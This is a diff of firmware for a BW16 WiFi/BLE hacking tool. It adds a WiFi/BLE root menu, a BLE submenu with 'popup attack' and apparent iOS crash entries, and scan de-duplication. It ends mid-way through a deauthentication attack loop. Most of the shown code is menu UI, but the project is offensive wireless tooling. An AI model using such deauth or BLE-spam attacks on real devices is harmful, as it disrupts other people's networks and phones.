@@ -2,8 +2,6 @@
  * @file BW16-Tools.ino
  * @author FlyingIce
  * @brief BW16 WIFI Tools
- * @version 0.1
- * @date 2025-09-03
  * @link https://github.com/FlyingIceyyds/BW16-Tools
  */
 
@@ -54,6 +52,12 @@ class __FlashStringHelper; // forward declaration for Arduino-style flash string
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 #include <U8g2_for_Adafruit_GFX.h>
+// BLE support (used only in BLE submenu actions)
+#include "BLEDevice.h"
+extern "C" {
+#include "gap_le.h"
+#include "gap_adv.h"
+}
 U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -86,6 +90,8 @@ static unsigned long g_faceLastRandomizeMs = 0;
 static const unsigned long FACE_RANDOMIZE_INTERVAL_MS = 4000;
 
 const int UI_RIGHT_GUTTER = 10; // 右侧预留滚动条与箭头区域（加宽以留出更协调的间距）
+// 控制在通用基础绘制中是否强制显示占位滚动条（用于BLE动画避免闪烁）
+static bool g_forceScrollbarAlwaysForGeneric = false;
 // 动画配置（优化启动速度）
 const int ANIM_STEPS = 6;       // 动画步数（更顺滑）
 const int ANIM_DELAY_MS = 0;    // 通用每步延时（非选择框移动场景）
@@ -140,6 +146,16 @@ struct HomeMenuItem {
   HomeAction action;
 };
 
+// Forward declarations for BLE actions and menus
+void bleHeadsetTest();
+void blePopupMenu();
+void blePopupStart_iOS();
+void blePopupStart_iOSActionModal();
+void blePopupStart_iOS17Crash();
+void blePlaceholderPage();
+void homeActionBleTest();
+void homeActionBlePopupTest();
+
 // Forward declarations for home actions (handlers)
 void homeActionSelectSSID();
 void homeActionAttackMenu();
@@ -151,6 +167,10 @@ void homeActionAttackDetect();
 void homeActionPacketMonitor();
 void homeActionDeepScan();
 void homeActionWebUI();
+
+// Root menu enter actions
+void rootActionEnterWifi();
+void rootActionEnterBle();
 
 // VARIABLES
 typedef struct {
@@ -174,7 +194,7 @@ SelectedAP _selectedNetwork;
 // Provide AP_Channel compatible getter used by handshake.h
 String AP_Channel = String(0);
 
-static String bytesToStr(const uint8_t* mac, int len) {
+static __attribute__((unused)) String bytesToStr(const uint8_t* mac, int len) {
   char buf[3*6];
   int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
   return String(buf);
@@ -276,8 +296,6 @@ static inline bool is24GChannel(int ch) {
   return ch >= 1 && ch <= 14;
 }
 
- 
-
 static inline bool is5GChannel(int ch) {
   return ch >= 36; // 简化判断：常见5G信道在36及以上
 }
@@ -305,12 +323,38 @@ int scrollindex = 0;
 int perdeauth = 3;
 int num = 0; // 添加全局变量声明
 
-// 首页分页起始索引（与攻击页相同的滚动效果）
+// Menu mode
+enum MenuMode { MENU_ROOT = 0, MENU_WIFI = 1, MENU_BLE = 2 };
+static MenuMode g_menuMode = MENU_ROOT;
+
+// Root menu state
+static int rootStartIndex = 0;
+static int rootState = 0;
+
+// BLE submenu state
+static int bleStartIndex = 0;
+static int bleState = 0;
+
+// WiFi submenu (existing home) state
 int homeStartIndex = 0;
-// 首页相对选择索引（与攻击页的attackstate类似）
 int homeState = 0; // 初始化为0，对应第一项
 
-// Unified registry: add new items here only (main menu)
+// Root menu (top-level)
+static const HomeMenuItem g_rootMenuItems[] = {
+  {"WIFI の 功能", rootActionEnterWifi},
+  {"BLE の 功能",  rootActionEnterBle}
+};
+static const int g_rootMenuCount = (int)(sizeof(g_rootMenuItems) / sizeof(g_rootMenuItems[0]));
+
+// BLE submenu (three options)
+static const HomeMenuItem g_bleMenuItems[] = {
+  {"蓝牙信标广播", homeActionBleTest},
+  {"蓝牙弹窗攻击", homeActionBlePopupTest},
+  {"README.md", blePlaceholderPage}
+};
+static const int g_bleMenuCount = (int)(sizeof(g_bleMenuItems) / sizeof(g_bleMenuItems[0]));
+
+// Unified registry: add new items here only (WiFi submenu)
 static const HomeMenuItem g_homeMenuItems[] = {
   {"选择AP/SSID",            homeActionSelectSSID},
   {"常规攻击[Attack]",       homeActionAttackMenu},
@@ -534,8 +578,6 @@ static void switchToNextChannelGroup() {
   }
 }
 
-
-
 // BW16/RTL8720DN: 2.4GHz 常用检测信道（保留兼容性）
 static const uint8_t detectChannels24G[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
 static volatile unsigned long g_promiscCbHits = 0;
@@ -692,7 +734,6 @@ static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, vo
       uint8_t type = (fc >> 2) & 0x3;
       uint8_t subtype = (fc >> 4) & 0xF;
       
-      
       // 只检测解除认证帧（subtype=12）和解除关联帧（subtype=10）
       if (type == 0) { // 管理帧
         bool isDeauth = (subtype == 12);
@@ -711,8 +752,13 @@ static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, vo
   }
 }
 
+// 前向声明，实际实现在BLE变量声明之后
+static void checkBleResourcesForWiFi();
+
 // 启动数据包侦测
 static void startPacketDetection() {
+  Serial.println("启动数据包监视器...");
+  
   g_packetCount = 0;
   g_packetDetectTotalPackets = 0;
   g_packetDetectRunning = true;
@@ -1887,7 +1933,32 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
     char bssid_str[] = "XX:XX:XX:XX:XX:XX";
     snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
     result.bssid_str = bssid_str;
-    scan_results.push_back(result);
+    // 去重：如果同一BSSID已存在，则仅更新更强RSSI并跳过插入
+    bool isDuplicate = false;
+    for (size_t i = 0; i < scan_results.size(); i++) {
+      bool same = true;
+      for (int k = 0; k < 6; k++) {
+        if (scan_results[i].bssid[k] != result.bssid[k]) { same = false; break; }
+      }
+      if (same) {
+        // 可选：若SSID为空而新结果有名称，或RSSI更强，则更新
+        if (scan_results[i].ssid.length() == 0 && result.ssid.length() > 0) {
+          scan_results[i].ssid = result.ssid;
+        }
+        if (result.rssi > scan_results[i].rssi) {
+          scan_results[i].rssi = result.rssi;
+          scan_results[i].channel = result.channel;
+          scan_results[i].security_type = result.security_type;
+          memcpy(&scan_results[i].bssid, &result.bssid, 6);
+          scan_results[i].bssid_str = result.bssid_str;
+        }
+        isDuplicate = true;
+        break;
+      }
+    }
+    if (!isDuplicate) {
+      scan_results.push_back(result);
+    }
   } else {
     // 扫描完成
     g_scanDone = true;
@@ -1896,9 +1967,49 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 }
 // 移除未使用的 selectedmenu()
 
+// 应急WiFi状态检测和恢复
+static bool emergencyWiFiRecovery() {
+  static unsigned long lastRecoveryAttempt = 0;
+  unsigned long now = millis();
+  
+  // 防止频繁恢复尝试
+  if (now - lastRecoveryAttempt < 30000) { // 30秒内最多一次
+    return false;
+  }
+  
+  Serial.println("=== 检测到WiFi异常，执行应急恢复 ===");
+  lastRecoveryAttempt = now;
+  
+  // 1. 强制清理所有状态
+  scan_results.clear();
+  scan_results.shrink_to_fit();
+  SelectedVector.clear();
+  SelectedVector.shrink_to_fit();
+  g_scanDone = false;
+  
+  // 2. 强制重置WiFi硬件
+  Serial.println("强制重置WiFi硬件...");
+  wifi_off();
+  delay(1000); // 更长的重置时间
+  wifi_on(RTW_MODE_AP);
+  delay(1000);
+  
+  // 3. 重新启动AP
+  String channelStr = String(current_channel);
+  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
+    Serial.println("应急恢复: AP重启成功");
+    return true;
+  } else {
+    Serial.println("应急恢复: AP重启失败");
+    return false;
+  }
+}
+
 int scanNetworks() {
   DEBUG_SER_PRINT("Scanning WiFi Networks...");
+  
   scan_results.clear();
+  scan_results.reserve(64); // 预分配内存，避免频繁重新分配
   SelectedVector.clear(); // 清空选中的WiFi列表
   g_scanDone = false;
   unsigned long startMs = millis();
@@ -1913,6 +2024,11 @@ int scanNetworks() {
     return 0;
   } else {
     DEBUG_SER_PRINT(" Failed!\n");
+    // 扫描失败时尝试应急恢复
+    if (scan_results.empty()) {
+      Serial.println("扫描失败且无结果，尝试应急恢复...");
+      emergencyWiFiRecovery();
+    }
     return 1;
   }
 }
@@ -2458,6 +2574,199 @@ void drawHomeMenuBasePaged_NoFlush(int startIndex) {
 }
 void drawHomeMenuBasePagedShim() { drawHomeMenuBasePaged_NoFlush(g_homeBaseStartIndex); }
 
+// ====== 通用菜单（可复用 WiFi 菜单样式与逻辑） ======
+
+// 通用滚动条（指定总项数与页大小）
+static inline void drawScrollbarGeneric(int totalCount, int pageSize, int startIndex) {
+  if (totalCount <= pageSize) return;
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+  float pageRatio = (float)pageSize / (float)totalCount;
+  int computedThumb = (int)(trackH * pageRatio);
+  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
+  float denom = (float)(totalCount - pageSize);
+  float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
+  if (posRatio < 0.0f) posRatio = 0.0f;
+  if (posRatio > 1.0f) posRatio = 1.0f;
+  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+static inline void drawScrollbarFractionGeneric(int totalCount, int pageSize, float startIndexF) {
+  if (totalCount <= pageSize) return;
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+  float pageRatio = (float)pageSize / (float)totalCount;
+  int computedThumb = (int)(trackH * pageRatio);
+  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
+  float denom = (float)(totalCount - pageSize);
+  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
+  if (posRatio < 0.0f) posRatio = 0.0f;
+  if (posRatio > 1.0f) posRatio = 1.0f;
+  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+
+// 始终绘制滚动条（占位用）：即便一页可展示全部，也显示轨道与最小拇指
+static inline void drawScrollbarGenericAlways(int totalCount, int pageSize, int startIndex) {
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+
+  int thumbH;
+  int thumbY;
+  if (totalCount <= pageSize) {
+    // 不需要分页时，绘制居中的竖线占位，左右与轨道留出间距
+    int lineHMargin = 3; // 顶部和底部间距
+    thumbH = trackH - lineHMargin * 2;
+    if (thumbH < 6) thumbH = 6;
+    thumbY = trackY + (trackH - thumbH) / 2;
+
+    int minLineWidth = 2;
+    int maxLineWidth = 3;
+    int lineW = barWidth / 4; // 基于轨道宽度估算合适粗细
+    if (lineW < minLineWidth) lineW = minLineWidth;
+    if (lineW > maxLineWidth) lineW = maxLineWidth;
+    int sideMargin = (barWidth - lineW) / 2; // 与轨道左右留白
+    // 稍微向左偏移1px，让其位于轨道内部的中间偏左
+    int lineX = barX + 1 + sideMargin - 1;
+    if (lineX < barX + 1) lineX = barX + 1; // 保证不贴边
+    display.fillRect(lineX, thumbY, lineW, thumbH, SSD1306_WHITE);
+    return;
+  } else {
+    float pageRatio = (float)pageSize / (float)totalCount;
+    int computedThumb = (int)(trackH * pageRatio);
+    thumbH = (computedThumb < 6) ? 6 : computedThumb;
+    float denom = (float)(totalCount - pageSize);
+    float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
+    if (posRatio < 0.0f) posRatio = 0.0f;
+    if (posRatio > 1.0f) posRatio = 1.0f;
+    thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  }
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+
+
+// 通用基础页绘制（不刷新）：复用WiFi菜单样式
+static void drawMenuBasePaged_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex) {
+  display.clearDisplay();
+  display.setTextSize(1);
+  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
+  for (int i = 0; i < visible; i++) {
+    int idx = startIndex + i;
+    if (idx >= itemCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
+    int textY = rectY + 13;
+    String label = items[idx].label;
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    if (labelWidth > maxTextWidth) {
+      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
+        label.remove(label.length() - 1);
+        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
+      }
+      label += "..";
+    }
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setCursor(5, textY);
+    u8g2_for_adafruit_gfx.print(label);
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
+  }
+  if (g_forceScrollbarAlwaysForGeneric) {
+    drawScrollbarGenericAlways(itemCount, HOME_PAGE_SIZE, startIndex);
+  } else {
+    drawScrollbarGeneric(itemCount, HOME_PAGE_SIZE, startIndex);
+  }
+}
+
+// 通用页绘制（带y偏移、不刷新）：用于翻页动画
+static inline void drawMenuPageWithOffset_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex, int yOffset) {
+  display.setTextSize(1);
+  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
+  for (int i = 0; i < visible; i++) {
+    int idx = startIndex + i;
+    if (idx >= itemCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
+    int textY = rectY + 13;
+    if (rectY > display.height() || rectY + HOME_RECT_HEIGHT < 0) continue;
+    String label = items[idx].label;
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    if (labelWidth > maxTextWidth) {
+      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
+        label.remove(label.length() - 1);
+        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
+      }
+      label += "..";
+    }
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setCursor(5, textY);
+    u8g2_for_adafruit_gfx.print(label);
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
+  }
+}
+
+// 通用翻页动画
+static inline void animateMenuPageFlip_Generic(const HomeMenuItem* items, int itemCount, int fromStartIndex, int toStartIndex) {
+  if (fromStartIndex == toStartIndex) return;
+  int delta = toStartIndex - fromStartIndex;
+  if (delta != 1 && delta != -1) {
+    drawMenuBasePaged_NoFlush_Generic(items, itemCount, fromStartIndex);
+    display.display();
+    return;
+  }
+  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
+  unsigned long nextStepDeadline = millis() + delayPerStepMs;
+  for (int s = 1; s <= ANIM_STEPS; s++) {
+    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
+    int dir = (delta > 0) ? 1 : -1; // +1: 内容上移；-1: 内容下移
+    int fromYOffset = (dir > 0) ? -offset : offset;
+    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);
+    display.clearDisplay();
+    if (dir > 0) {
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
+    } else {
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
+    }
+    float progress = (float)offset / (float)HOME_ITEM_HEIGHT;
+    float startIndexF = (float)fromStartIndex + progress * (float)delta;
+    drawScrollbarFractionGeneric(itemCount, HOME_PAGE_SIZE, startIndexF);
+    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
+    if (delayPerStepMs > 0) {
+      while ((long)(millis() - nextStepDeadline) < 0) { }
+      nextStepDeadline += delayPerStepMs;
+    }
+  }
+}
+
+// 选择动画（通用）：使用通用基础绘制shim
+static const HomeMenuItem* g_genericMenuItems = nullptr;
+static int g_genericMenuCount = 0;
+static int g_genericBaseStartIndex = 0;
+static void drawGenericMenuBaseShim() { drawMenuBasePaged_NoFlush_Generic(g_genericMenuItems, g_genericMenuCount, g_genericBaseStartIndex); }
+// 前置声明：选择动画（在下方定义）
+static inline void animateSelectionGeneric(int yFrom, int yTo, int rectHeight, int cornerRadius, bool useFullWidth, bool doubleOutline, void (*drawBaseNoFlush)());
+static inline void animateMoveGenericMenu(int yFrom, int yTo, int rectHeight, int startIndex) {
+  g_genericBaseStartIndex = startIndex;
+  bool prev = g_forceScrollbarAlwaysForGeneric;
+  // 在BLE上下文中调用该动画时，外部会先设置 g_genericMenuItems/genericMenuCount
+  // 在动画期间强制显示占位滚动条，降低闪烁
+  g_forceScrollbarAlwaysForGeneric = (g_genericMenuItems == g_bleMenuItems);
+  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawGenericMenuBaseShim);
+  g_forceScrollbarAlwaysForGeneric = prev;
+}
+
 // 内部辅助：绘制某页并整体添加y偏移（不刷新）。偏移允许为负/正，用于翻页过渡。
 static inline void drawHomePageWithOffset_NoFlush(int startIndex, int yOffset) {
   display.setTextSize(1);
@@ -2925,21 +3234,188 @@ void animateMoveHome(int yFrom, int yTo, int rectHeight, int startIndex) {
   animateSelectionGeneric(yFrom, yTo, rectHeight, 7, /*useFullWidth=*/false, /*doubleOutline=*/false, drawHomeMenuBasePagedShim);
 }
 
+// ===== Root menu (WIFI / BLE) =====
+void drawRootMenu() {
+  // 新的主菜单样式：圆角矩形，居中显示，带间距
+  display.clearDisplay();
+  display.setTextSize(1);
+  
+  // 计算总高度和起始Y位置
+  int totalHeight = (g_rootMenuCount * 20) + ((g_rootMenuCount - 1) * 8);
+  int startY = (display.height() - totalHeight) / 2;
+  
+  for (int i = 0; i < g_rootMenuCount; i++) {
+    int menuIndex = i;
+    if (menuIndex >= g_rootMenuCount) break;
+    
+    // 计算选项位置
+    int rectY = startY + i * (20 + 8);
+    int rectX = 14;
+    
+    bool isSel = (i == rootState);
+    
+    // 绘制选项背景
+    if (isSel) {
+      // 选中状态：填充圆角矩形
+      display.fillRoundRect(rectX, rectY, 100, 20, 3, SSD1306_WHITE);
+    } else {
+      // 未选中状态：绘制圆角矩形边框
+      display.drawRoundRect(rectX, rectY, 100, 20, 3, SSD1306_WHITE);
+    }
+    
+    // 计算文字位置（居中）
+    const char* label = g_rootMenuItems[menuIndex].label;
+    int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(label);
+    int textX = rectX + (100 - textWidth) / 2;
+    int textY = rectY + (20 + 8) / 2; // 垂直居中
+    
+    // 设置文字颜色和绘制
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    if (isSel) {
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK); // 选中时黑色文字
+    } else {
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE); // 未选中时白色文字
+    }
+    u8g2_for_adafruit_gfx.setCursor(textX, textY);
+    u8g2_for_adafruit_gfx.print(label);
+  }
+  
+  display.display();
+}
+
+inline void setRootSelection(int startIndex, int state) {
+  rootStartIndex = startIndex;
+  rootState = state;
+}
+
+inline void rootMoveUp(unsigned long currentTime) {
+  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
+  if (rootState > 0) setRootSelection(rootStartIndex, rootState - 1);
+  lastDownTime = currentTime;
+}
+inline void rootMoveDown(unsigned long currentTime) {
+  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
+  if (rootState < g_rootMenuCount - 1) setRootSelection(rootStartIndex, rootState + 1);
+  lastUpTime = currentTime;
+}
+inline void handleRootOk() {
+  if (digitalRead(BTN_OK) != LOW) return; delay(200);
+  int idx = rootStartIndex + rootState;
+  if (idx >= 0 && idx < g_rootMenuCount && g_rootMenuItems[idx].action) g_rootMenuItems[idx].action();
+}
+
+// ===== BLE submenu =====
+// BLE 子菜单改为复用通用菜单绘制与动画
+static bool g_bleSkipNextSelectAnim = false;
+void drawBleMenu() {
+  static int prevBleState = -1;
+  // 选择动画准备
+  g_genericMenuItems = g_bleMenuItems;
+  g_genericMenuCount = g_bleMenuCount;
+  g_genericBaseStartIndex = bleStartIndex;
+  if (prevBleState == -1) prevBleState = bleState;
+  if (!g_bleSkipNextSelectAnim && prevBleState != bleState) {
+    int yFrom = HOME_Y_OFFSET + prevBleState * HOME_ITEM_HEIGHT;
+    int yTo   = HOME_Y_OFFSET + bleState   * HOME_ITEM_HEIGHT;
+    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, bleStartIndex);
+    prevBleState = bleState;
+  } else if (g_bleSkipNextSelectAnim) {
+    prevBleState = bleState;
+    g_bleSkipNextSelectAnim = false;
+  }
+  // 绘制当前页
+  display.clearDisplay();
+  display.setTextSize(1);
+  int visible = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
+  for (int i = 0; i < visible; i++) {
+    int idx = bleStartIndex + i; if (idx >= g_bleMenuCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
+    int textY = rectY + 13;
+    bool isSel = (i == bleState);
+    String label = g_bleMenuItems[idx].label;
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    if (labelWidth > maxTextWidth) {
+      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
+        label.remove(label.length() - 1);
+        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
+      }
+      label += "..";
+    }
+    if (isSel) {
+      display.fillRoundRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
+      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
+      u8g2_for_adafruit_gfx.print(label);
+    } else {
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
+      u8g2_for_adafruit_gfx.print(label);
+    }
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
+  }
+  // BLE 菜单即便无需翻页也绘制占位滚动条
+  drawScrollbarGenericAlways(g_bleMenuCount, HOME_PAGE_SIZE, bleStartIndex);
+  display.display();
+}
+inline void setBleSelection(int startIndex, int state) { bleStartIndex = startIndex; bleState = state; }
+// BLE 上/下移动复用通用逻辑（带翻页动画）
+inline void bleMoveUp(unsigned long currentTime) {
+  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
+  if (bleState > 0) {
+    setBleSelection(bleStartIndex, bleState - 1);
+  } else if (bleStartIndex > 0) {
+    int prevStart = bleStartIndex;
+    setBleSelection(bleStartIndex - 1, 0);
+    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, bleStartIndex);
+    g_bleSkipNextSelectAnim = true;
+  }
+  lastDownTime = currentTime;
+}
+inline void bleMoveDown(unsigned long currentTime) {
+  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
+  int currentPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
+  if (bleState < currentPageItems - 1) {
+    setBleSelection(bleStartIndex, bleState + 1);
+  } else if (bleStartIndex + bleState + 1 < g_bleMenuCount) {
+    int prevStart = bleStartIndex;
+    int nextStartIndex = bleStartIndex + 1;
+    int nextPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - nextStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - nextStartIndex);
+    int nextState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
+    setBleSelection(nextStartIndex, nextState);
+    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, nextStartIndex);
+    g_bleSkipNextSelectAnim = true;
+  }
+  lastUpTime = currentTime;
+}
+inline void handleBleOk() {
+  if (digitalRead(BTN_OK) != LOW) return; delay(200);
+  int idx = bleStartIndex + bleState;
+  if (idx >= 0 && idx < g_bleMenuCount && g_bleMenuItems[idx].action) g_bleMenuItems[idx].action();
+}
+
+// ===== Existing WiFi submenu (Home menu) =====
 void drawHomeMenu() {
   static int prevState = -1;
-  const int MAX_DISPLAY_ITEMS = 3; // 保持每页３项
 
   int startIndex = homeStartIndex;
   g_homeBaseStartIndex = startIndex;
 
+  // 将 WiFi 菜单切换到通用菜单上下文
+  g_genericMenuItems = g_homeMenuItems;
+  g_genericMenuCount = g_homeMenuCount;
+  g_genericBaseStartIndex = startIndex;
+
   if (prevState == -1) prevState = homeState;
 
-  // 只在选择项改变时播放选择动画，翻页动画由loop函数处理
+  // 只在选择项改变时播放选择动画，翻页动画由按键处理
   if (!g_skipNextSelectAnim && prevState != homeState) {
     int yFrom = HOME_Y_OFFSET + prevState * HOME_ITEM_HEIGHT;
     int yTo = HOME_Y_OFFSET + homeState * HOME_ITEM_HEIGHT;
-    // 使用与攻击页完全一致的动画效果
-    animateMove(yFrom, yTo, HOME_RECT_HEIGHT, drawHomeMenuBasePagedShim);
+    // 使用通用菜单选择动画（与 BLE 复用一致）
+    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, startIndex);
     prevState = homeState;
   } else if (g_skipNextSelectAnim) {
     // 跳过一次选择动画后立即恢复
@@ -2998,6 +3474,10 @@ void drawHomeMenu() {
   display.display();
 }
 
+// Root enter actions
+void rootActionEnterWifi() { g_menuMode = MENU_WIFI; setHomeSelection(0, 0); }
+void rootActionEnterBle()  { g_menuMode = MENU_BLE;  setBleSelection(0, 0); }
+
 // 首页菜单：统一同步选择状态到全局，并更新基础绘制起始索引
 inline void setHomeSelection(int startIndex, int state) {
   homeStartIndex = startIndex;
@@ -3015,7 +3495,8 @@ inline void homeMoveUp(unsigned long currentTime) {
     // 向上滚动一项
     int prevStart = homeStartIndex;
     setHomeSelection(homeStartIndex - 1, 0);
-    animateHomePageFlip(prevStart, homeStartIndex);
+    // 使用通用菜单翻页动画
+    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, homeStartIndex);
     g_skipNextSelectAnim = true;
   }
   lastDownTime = currentTime;
@@ -3037,7 +3518,8 @@ inline void homeMoveDown(unsigned long currentTime) {
     // 设置homeState为最后一行的索引（确保在新页范围内）
     int nextHomeState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
     setHomeSelection(nextStartIndex, nextHomeState);
-    animateHomePageFlip(prevStart, nextStartIndex);
+    // 使用通用菜单翻页动画
+    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, nextStartIndex);
     g_skipNextSelectAnim = true;
   }
   // 当到达最后一页的最后一个项目时，不执行任何操作（阻止继续向下移动）
@@ -3265,7 +3747,11 @@ void drawssid() {
     // 根据当前选择数量动态计算是否"全选"
     allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
     
-    if(digitalRead(BTN_BACK)==LOW) break;
+    if(digitalRead(BTN_BACK)==LOW) {
+      // 等待按键释放，避免主循环立即检测到返回键
+      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+      return;
+    }
     
     if(digitalRead(BTN_OK) == LOW) {
       delay(400);
@@ -5401,6 +5887,35 @@ void StableAutoMulti() {
       }
     }
 
+    // 处理未在 allChannels 中的信道
+    for (const auto &eb : channelBucketsCache.extras) {
+      if (eb.bssids.empty()) continue;
+      wext_set_channel(WLAN0_NAME, eb.channel);
+      for (const uint8_t *bssidPtr : eb.bssids) {
+        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
